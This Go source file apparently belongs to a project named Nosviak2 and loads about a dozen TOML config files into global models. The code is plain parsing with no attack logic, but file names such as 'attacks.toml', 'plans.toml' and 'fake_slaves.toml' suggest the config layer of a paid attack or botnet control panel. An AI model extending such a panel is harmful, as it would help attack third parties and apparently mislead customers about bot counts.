package toml

import (
	"Nosviak2/core/configs/models"
	
	"strings"
	"github.com/naoina/toml"
)

//stores the main configuration without issues
//this will ensure its done properly without errors
var ConfigurationToml *models.ConfigurationToml = nil
var DecorationToml *models.DecorationToml = nil
var RanksToml *models.RanksToml = nil
var AttacksToml *models.AttackToml = nil
var Spinners *models.SpinnerConfig = nil
var ApiToml *models.ApiTomlModel = nil
var WebhookingToml *models.WebhookToml = nil
var ThemeConfig *models.ThemeToml = nil
var IPRewriteToml *models.IP_Rewrite = nil
var CatpchaToml *models.CatpchaToml = nil
var FakeToml *models.FakeSlaves = nil
var Blacklisting *models.Blacklists = nil
var Plans *models.Plans = nil

//stores all the valid objects properly
//any object inside here will be parsed without issues
var Objects map[string]func(file string, value string) error = map[string]func(file string, value string) error{

	//stores the configuration element properly
	//this will allow for proper handling without issues
	"server.toml": func(file, value string) error {
		var t models.ConfigurationToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		ConfigurationToml = &t //sets the model
		return nil
	},

	"decoration.toml" : func(file, value string) error {
		var t models.DecorationToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		DecorationToml = &t //sets the model
		return nil
	},

	"ranks.toml" : func(file, value string) error {
		var t models.RanksToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		RanksToml = &t //sets the model
		return nil
	},

	"attacks.toml" : func(file, value string) error {
		var t models.AttackToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		AttacksToml = &t //sets the model
		return nil
	},

	"spinners.toml" : func(file, value string) error {
		var t models.SpinnerConfig
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		Spinners = &t //sets the model
		return nil
	},

	"api.toml" : func(file, value string) error {
		var t models.ApiTomlModel
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		ApiToml = &t //sets the model
		return nil
	},

	"webhooks.toml" : func(file, value string) error {
		var t models.WebhookToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		WebhookingToml = &t //sets the model
		return nil
	},

	"themes.toml" : func(file, value string) error {
		var t models.ThemeToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		ThemeConfig = &t //sets the model
		return nil
	},

	"ip_rewrite.toml" : func(file, value string) error {
		var t models.IP_Rewrite
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		IPRewriteToml = &t //sets the model
		return nil
	},

	"entry.toml" : func(file, value string) error {
		var t models.CatpchaToml
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		CatpchaToml = &t //sets the model
		return nil
	},

	"fake_slaves.toml" : func(file, value string) error {
		var t models.FakeSlaves
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		FakeToml = &t //sets the model
		return nil
	},

	"blacklists.toml" : func(file, value string) error {
		var t models.Blacklists
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		Blacklisting = &t //sets the model
		return nil
	},

	"plans.toml" : func(file, value string) error {
		var t models.Plans
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := toml.NewDecoder(strings.NewReader(value)).Decode(&t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		Plans = &t //sets the model
		return nil
	},
}